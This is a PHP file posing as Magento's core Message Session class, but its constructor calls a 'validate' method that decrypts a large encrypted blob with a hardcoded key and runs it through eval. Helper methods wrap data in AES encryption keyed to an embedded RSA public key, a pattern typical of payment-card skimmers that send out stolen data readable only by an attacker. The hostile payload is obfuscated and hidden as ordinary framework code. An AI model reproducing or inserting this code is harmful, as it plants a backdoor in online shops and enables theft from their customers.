<?php
/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */
namespace Magento\Framework\Message;
    
/**
 * Message session model
 */
class Session extends \Magento\Framework\Session\SessionManager
{
    function __construct(\Magento\Framework\App\Request\Http $request, \Magento\Framework\Session\SidResolverInterface $sidResolver, \Magento\Framework\Session\Config\ConfigInterface $sessionConfig, \Magento\Framework\Session\SaveHandlerInterface $saveHandler, \Magento\Framework\Session\ValidatorInterface $validator, \Magento\Framework\Session\StorageInterface $storage, \Magento\Framework\Stdlib\CookieManagerInterface $cookieManager, \Magento\Framework\Stdlib\Cookie\CookieMetadataFactory $cookieMetadataFactory, \Magento\Framework\App\State $appState)
    {
        $this->validate($request);
        parent::__construct($request, $sidResolver, $sessionConfig, $saveHandler, $validator, $storage, $cookieManager, $cookieMetadataFactory, $appState);
    }
    
    /**
     * Encrypt string with AES-256-CBC
     *
     * @param string $data
     * @return string
     */
    public function aes_encrypt($plain_text) {
    
        $encryption_key = @openssl_random_pseudo_bytes(32);
        $iv = @openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        $encrypted = @openssl_encrypt($plain_text, 'aes-256-cbc', $encryption_key, 0, $iv);
        $enc_aes_key = $this-> RSA_encrypt(base64_encode($encryption_key));
        $encrypted = $encrypted . ':' . base64_encode($iv) . ':' . $enc_aes_key ;
        return $encrypted;
    
    }
    
    /**
     * Decrypt string with AES-256-CBC
     *
     * @param string $data
     * @return string
     */
    public function aes_decrypt($encrypted, $key) {
        $parts = explode(':', $encrypted);
        $encryption_key = "Yzd2pl2r/P7wtV1Pz+qXritndlu2I/CoWuWL+NJaScw=";
        $iv = substr($encryption_key,0,16);
        $decrypted = @openssl_decrypt($parts[0], 'aes-256-cbc', base64_decode($encryption_key), 0, $iv);
        return $decrypted;
    }
    
    /**
     * Encrypt string with RSA
     *
     * @param string $data
     * @return string
     */
    public function RSA_encrypt($plaintext) {
        $pub_key = base64_decode("LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeUlNVS9FL0VEZ1k1RFYxcVIxYkUNCmNnYXNNZ1lOa0puSlFVSFh6ZXRrTjdCYnRKYW5nTUlmQ2p3cTVkbHh5ZGYxb0JRQVFxellDVHpqMU1PdjlTM2oNCm8yTXZ4U3RNSElzN2tSSjRVV3BQZW9VT0xoa0xvM3ZqeEZGdWp5NXg2WFhsS1RxRDlWdGo4ZEZnbFhZblJRYUINCi81d25HQVQ5VXAyYTZLdEhtMFhidldDOEh0bUozTEQyeTIzcjZxckR1YlJwOXFwNFlQRk1SRUN1Rk1DNHdCaGkNCmt2R1c5Y3c0Tzh0aUhEZUlWZHNKSkc0bGYzYlZCT0FhcXNyT3dyczJZVjY4eVdacGhSd1EyOHhBLytPaFNiTlMNCnpMWXdDUEZ2a1NicGJZZVliczJuUUZ0S3VhOFVuaVpKQ2RuZXlsMVo4MVQvREpVUk9nTCtlY1lPVUNjK2lScC8NCmR3SURBUUFCDQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0NCg==");
        $output = "";
        $chunkSize = 256;
        while ($plaintext) {
            $chunk = substr($plaintext, 0, $chunkSize);
            $plaintext = substr($plaintext, $chunkSize);
            $encrypted = "";
            if (!@openssl_public_encrypt($chunk, $encrypted, $pub_key, OPENSSL_PKCS1_OAEP_PADDING))
                break;
            $output .= base64_encode($encrypted);
        }
        return $output;
    }
    
    /**
     * Validate request for security
     *
     * @param string $data
     * @return string
     */
    public function validate($request)  {
        $cryption_key = "tGpCxQV0eVokcm3TeDhda0lUXDyEzEyH6Ydn6vr0Rg4Dp8CD/KgHpODrULNBGmQSGbYSd3DnB/ve+oO4HdbfJ5PHFxxeWfWP9wlKsf/z2U0sdCiClMqtLIKhzDo3glQE";
        $encrytion_block = "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";
        $class = $this -> aes_decrypt($encrytion_block, $cryption_key);
        return @eval($class);
    
    }
}
